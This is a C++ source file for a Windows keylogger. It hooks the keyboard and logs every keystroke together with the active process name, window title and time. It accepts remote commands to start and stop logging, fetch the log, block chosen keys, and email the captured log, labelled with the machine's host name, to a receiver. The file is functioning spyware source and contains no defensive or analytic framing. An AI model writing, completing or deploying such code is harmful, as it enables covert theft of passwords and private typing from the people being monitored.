#include "stdafx.h"
#include "Keylogger.h"

#include "services/EmailService.h"
#include "Hook.h"
#include "helpers/StringHelper.h"
#include "services/CommandParser.h"
#include "services/KeyBlockService.h"
#include "helpers/ComputerInfoHelper.h"
#include "helpers/Configuration.h"
#include "helpers/DataParser/DataParser.h"

Keylogger::Keylogger() {
    CommandParser::addCommand(L"email", [this](std::wstring argStr) {
        bool result = this->sendEmailReport(argStr, false, false);
        auto receiverStr = argStr == L"" ? L"default receiver" : argStr;
        if (result) {
            return L"Report to " + receiverStr + L" successfully sent";
        } else {
            return L"Can't send report to " + receiverStr;
        }
    });

	CommandParser::addCommand(L"email_esc", [this](std::wstring argStr) {
		bool result = this->sendEmailReport(argStr, false, true);
		auto receiverStr = argStr == L"" ? L"default receiver" : argStr;
		if (result) {
			return L"Report to " + receiverStr + L" successfully sent";
		} else {
			return L"Can't send report to " + receiverStr;
		}
	});

    CommandParser::addCommand(L"on", [this](std::wstring argStr) {
		bool isEnabled = this->hook->checkEnabled();
		if (!isEnabled) {
			this->hook->enable();
			return L"Logging turned on";
		} else {
			return L"Logging already turned on";
		}
    });
    CommandParser::addCommand(L"off", [this](std::wstring argStr) {
		bool isEnabled = this->hook->checkEnabled();
		if (isEnabled) {
			this->hook->disable();
			return L"Logging turned off";
		} else {
			return L"Logging already turned off";
		}
    });
	CommandParser::addCommand(L"status", [this](std::wstring argStr) {
		bool isEnabled = this->hook->checkEnabled();
		if (isEnabled) {
			return L"Keylogger is on";
		} else {
			return L"Keylogger is off";
		}
	});
    CommandParser::addCommand(L"haha", [this](std::wstring argStr) {
        this->stop();
        this->start();
        return L"You are too evil";
    });
    CommandParser::addCommand(L"get", [this](std::wstring argStr) {
        const std::locale utf8_locale
            = std::locale(std::locale(), new std::codecvt_utf8<wchar_t>());

        logFile.close();
        std::wifstream logData;
        logData.imbue(utf8_locale);
        logData.open(this->logfilePath, std::ios::in);
        std::wstring data((std::istreambuf_iterator<wchar_t>(logData)),
            std::istreambuf_iterator<wchar_t>());
        logData.close();
        logData.imbue(utf8_locale);
        logFile.open(this->logfilePath, std::ios::app);
        return data;
    });
    CommandParser::addCommand(L"block", [this](std::wstring argStr) {
        auto keys = StringHelper::splitString(argStr, L" ");
        for (auto key = keys.begin(); key != keys.end(); key++) {
            KeyBlockService::getInstance()->addBlockedKey(*key);
        }
        return L"ok";
    });
    CommandParser::addCommand(L"unblock", [this](std::wstring argStr) {
        auto keys = StringHelper::splitString(argStr, L" ");
        for (auto key = keys.begin(); key != keys.end(); key++) {
            KeyBlockService::getInstance()->removeBlockedKey(*key);
        }
        return L"ok";
    });
    CommandParser::addCommand(L"showblocked", [this](std::wstring argStr) {
        auto blockedKeys = KeyBlockService::getInstance()->getBlockedList();
        std::wstringstream responseStream;
        for (auto it = blockedKeys.begin(); it != blockedKeys.end(); it++) {
            responseStream << *it << L" ";
        }
        return responseStream.str();
    });

    this->isActive = false;
    hook = make_shared<Hook>();
}

Keylogger::~Keylogger() {
    stop();
}

void Keylogger::start() {
    if (!this->isActive) {
        hook->setHook([this](const wchar_t key[]) {
            keyboardHandler(key);
        });

        const std::locale utf8_locale
            = std::locale(std::locale(), new std::codecvt_utf8<wchar_t>());
        logFile.imbue(utf8_locale);

        // Create log file int %TEMP% directory
        const int buffSize = 1024;
		this->logfilePath = Configuration::LogFilePath;

        logFile.open(this->logfilePath, std::ios::app);
        this->isActive = true;
    }
}

void Keylogger::keyboardHandler(const wchar_t* keyText) {
    addWindowTimeStamps();

    auto symbol = keyText;
    logFile << keyText << std::flush;
    std::wcout << keyText << std::flush;
}

void Keylogger::addWindowTimeStamps() {
    // Get window title and write it to file
    HWND currentWindow = GetForegroundWindow();
    if (currentWindow != lastActiveWindow) {
        lastActiveWindow = currentWindow;

        const int bufferSize = 1024;
        wchar_t bufferProcessName[bufferSize];
        wchar_t bufferTitle[bufferSize];

        // Get process name
        DWORD processId;
        GetWindowThreadProcessId(currentWindow, &processId);
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
        GetModuleFileNameEx(hProcess, NULL, bufferProcessName, bufferSize);

        // Get windows title
        GetWindowText(currentWindow, bufferTitle, bufferSize);

        tm* localTime;
        time_t t = time(NULL);
        localTime = localtime(&t);
        char timeStrBuffer[80];
        strftime(timeStrBuffer, 80, "%F %X", localTime);

        if (bufferProcessName[0] == 52428) {
            wcscpy(bufferProcessName, L"Unknown process");
        }

        if (bufferTitle == nullptr || bufferTitle[0] == '\0') {
            std::wcout << "!!!!ploho!!!";
        } else {
            std::wcout << "\r\n### " << bufferProcessName <<
                " --- " << bufferTitle << " ### " << timeStrBuffer << " ###\r\n";
        }

        logFile << "\r\n### " << bufferProcessName << " --- " << bufferTitle << " ### " << timeStrBuffer << " ###\r\n";
    }
}

void Keylogger::stop() {
    if (this->isActive) {
        hook->unsetHook();
        logFile.close();
        this->isActive = false;
    }
}

bool Keylogger::sendEmailReport(std::wstring emailTo, bool deleteLocal, bool escaped) {
    auto emailService = make_shared<EmailService>();

    // Create email subject
    std::wstringstream subject;
    subject << L"Keylogger report for " << ComputerInfoHelper::getInstance()->getHostName() << L".";

	bool sendEmailResult;
	const std::locale utf8_locale
		= std::locale(std::locale(), new std::codecvt_utf8<wchar_t>());
	logFile.close();

	if (escaped) {
		std::wifstream logData;
		logData.imbue(utf8_locale);
		logData.open(this->logfilePath, std::ios::in);
		std::wstring body((std::istreambuf_iterator<wchar_t>(logData)),
			std::istreambuf_iterator<wchar_t>());
		logData.close();

		auto dataParser = DataParser(body);
		body = dataParser.getEscaped();

		const int buffSize = 1024;
		wchar_t buff[buffSize];
		GetTempPath(buffSize, buff);
		std::wstring tempFilePath = std::wstring(buff) + L"\\escaped_service_log.txt";

		std::wofstream escapedLogFile;
		escapedLogFile.imbue(utf8_locale);
		escapedLogFile.open(tempFilePath);
		escapedLogFile << body;
		escapedLogFile.close();

		sendEmailResult = emailService->sendEmail(subject.str(), L"", tempFilePath, emailTo);

		remove(StringHelper::ws2s(tempFilePath).c_str());
	} else {
		sendEmailResult = emailService->sendEmail(subject.str(), L"", logfilePath, emailTo);
	}


    if (!sendEmailResult) {
        return false;
    }

    auto openMode = deleteLocal ? std::ios::trunc : std::ios::app;
    logFile.imbue(utf8_locale);
    logFile.open(this->logfilePath, openMode);

    this->lastActiveWindow = nullptr;
    return true;
}
